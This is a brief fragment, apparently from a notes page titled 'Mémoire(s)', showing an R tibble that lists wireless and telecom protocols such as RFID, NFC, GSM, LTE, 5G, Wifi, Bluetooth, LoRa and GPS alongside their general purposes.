Mémoire(s)
…
List (non-exhaustive) of Protocols ————————————–

# A tibble: 22 × 2
   Protocol                Purpose                                      
   <chr>                   <chr>                                        
 1 RFID                    Traceabitlity / Static Information Exchange  
 2 NFC                     Bank Operations / Static Information Exchange
 3 GSM/GPRS*/EDGE*         Calls / SMS / Internet*                      
 4 UMTS/HSPA/HSPA_advanced Calls / SMS / Internet                       
 5 LTE/LTE_Advanced        Calls / SMS / Internet / IoT                 
 6 5G SA/NSA               Calls / SMS / Internet / IoT                 
 7 Wifi                    Internet / LAN / Calls (VoWifi)              
 8 Bluetooth               Data exchange / Pairing devices              
 9 LoRa/SigFox             Data exchange / IoT                          
10 GPS/Galileo             Geolocalization                              
# ℹ 12 more rows
…
